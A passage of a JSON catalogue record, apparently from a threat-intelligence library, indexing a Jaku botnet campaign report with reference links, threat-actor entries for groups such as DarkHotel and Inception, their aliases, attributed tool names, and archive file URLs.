            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "99593a68-7f6e-400e-9a9f-a707f66d2e72",
            "created_at": "2022-11-23T11:07:14.353321Z",
            "updated_at": "2022-11-23T11:07:14.353321Z",
            "deleted_at": null,
            "name": "AGRO",
            "url": "https://apt.threattracking.com",
            "description": "APT Groups and Operations Spreadsheet",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2016/2016.05.05_Jaku_botnet_campaign/report_jaku_analysis_of_botnet_campaign_en_0.pdf",
        "https://www.forcepoint.com/sites/default/files/resources/files/report_jaku_analysis_of_botnet_campaign_en_0.pdf"
    ],
    "report_names": [
        "report_jaku_analysis_of_botnet_campaign_en_0",
        "report_jaku_analysis_of_botnet_campaign_en_0.pdf"
    ],
    "threat_actors": [
        {
            "id": "1dadf04e-d725-426f-9f6c-08c5be7da159",
            "created_at": "2022-10-25T15:50:23.624538Z",
            "updated_at": "2025-03-27T02:00:55.508759Z",
            "deleted_at": null,
            "main_name": "Darkhotel",
            "aliases": [
                "Darkhotel",
                "DUBNIUM",
                "Zigzag Hail"
            ],
            "source_name": "MITRE:Darkhotel",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "c91e335e-42be-48d9-96b5-ba56749a723b",
            "created_at": "2022-10-25T16:07:23.458346Z",
            "updated_at": "2025-03-27T02:02:09.813395Z",
            "deleted_at": null,
            "main_name": "CIA",
            "aliases": [
                "Central Intelligence Agency"
            ],
            "source_name": "ETDA:CIA",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "77b28afd-8187-4917-a453-1d5a279cb5e4",
            "created_at": "2022-10-25T15:50:23.768278Z",
            "updated_at": "2025-03-27T02:00:55.5423Z",
            "deleted_at": null,
            "main_name": "Inception",
            "aliases": [
                "Inception Framework",
                "Cloud Atlas"
            ],
            "source_name": "MITRE:Inception",
            "tools": [
                "PowerShower",
                "VBShower",
                "LaZagne"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b13c19d6-247d-47ba-86ba-15a94accc179",
            "created_at": "2024-05-01T02:03:08.149923Z",
            "updated_at": "2025-03-27T02:05:17.422065Z",
            "deleted_at": null,
            "main_name": "TUNGSTEN BRIDGE",
            "aliases": [
                "DUBNIUM ",
                "DarkHotel ",
                "CTG-1948 "
            ],
            "source_name": "Secureworks:TUNGSTEN BRIDGE",
            "tools": [
                "Nemim"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "2b4eec94-7672-4bee-acb2-b857d0d26d12",
            "created_at": "2023-01-06T13:46:38.272109Z",
            "updated_at": "2025-03-27T02:00:02.790029Z",
            "deleted_at": null,
            "main_name": "DarkHotel",
            "aliases": [
                "DUBNIUM",
                "Fallout Team",
                "Luder",
                "Tapaoux",
                "Shadow Crane",
                "APT-C-06",
                "SIG25",
                "Karba",
                "Nemim",
                "Nemin",
                "G0012",
                "ATK52",
                "T-APT-02",
                "TUNGSTEN BRIDGE",
                "Zigzag Hail"
            ],
            "source_name": "MISPGALAXY:DarkHotel",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c0cedde3-5a9b-430f-9b77-e6568307205e",
            "created_at": "2022-10-25T16:07:23.528994Z",
            "updated_at": "2025-03-27T02:02:09.847683Z",
            "deleted_at": null,
            "main_name": "DarkHotel",
            "aliases": [
                "APT-C-06",
                "ATK 52",
                "CTG-1948",
                "Dubnium",
                "Fallout Team",
                "Higaisa",
                "Luder",
                "Operation DarkHotel",
                "Operation Daybreak",
                "Operation Inexsmar",
                "Operation PowerFall",
                "Operation The Gh0st Remains the Same",
                "SIG25",
                "Shadow Crane",
                "T-APT-02",
                "Tungsten Bridge",
                "Zigzag Hail"
            ],
            "source_name": "ETDA:DarkHotel",
            "tools": [
                "Asruex",
                "DarkHotel",
                "DmaUp3.exe",
                "GreezeBackdoor",
                "Karba",
                "Nemain",
                "Nemim",
                "Ramsay",
                "Retro",
                "Tapaoux",
                "Trojan.Win32.Karba.e",
                "Virus.Win32.Pioneer.dx",
                "igfxext.exe",
                "msieckc.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716497,
    "ts_updated_at": 1743041741,
    "ts_creation_date": 1462358858,
    "ts_modification_date": 1462358858,
    "files": {
        "pdf": "https://archive.orkl.eu/6a5001adf44feb6d08eb65ca04370476188965cd.pdf",
        "text": "https://archive.orkl.eu/6a5001adf44feb6d08eb65ca04370476188965cd.txt",
        "img": "https://archive.orkl.eu/6a5001adf44feb6d08eb65ca04370476188965cd.jpg"
    }
}